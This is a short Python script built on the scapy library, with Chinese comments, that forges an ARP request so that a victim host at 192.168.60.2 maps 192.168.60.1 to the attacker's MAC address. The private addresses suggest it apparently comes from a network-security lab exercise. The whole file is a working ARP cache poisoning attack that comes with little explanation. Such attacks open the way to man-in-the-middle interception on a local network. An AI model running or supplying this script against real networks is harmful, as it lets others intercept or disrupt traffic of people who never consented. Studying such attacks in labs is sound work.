#!/usr/bin/python3
from scapy.all import *
# 从hostm发
IP_victim    = "192.168.60.2" # arp下毒的对象，接收该报文者
MAC_victim   = "02:42:c0:a8:3c:02" # 被下毒对象的mac地址

IP_spoofed      = "192.168.60.1" # 要伪造的ip，对受害者来说，该ip的所有者的mac地址为mac_spoofed
MAC_spoofed     = "02:42:c0:a8:3c:03" # 攻击机的mac地址

print("SENDING SPOOFED ARP REQUEST......")

ether = Ether()
ether.dst = MAC_victim
ether.src = MAC_spoofed

arp = ARP()
arp.psrc  = IP_spoofed
arp.hwsrc = MAC_spoofed
arp.pdst  = IP_victim
arp.op = 1
frame = ether/arp
sendp(frame)

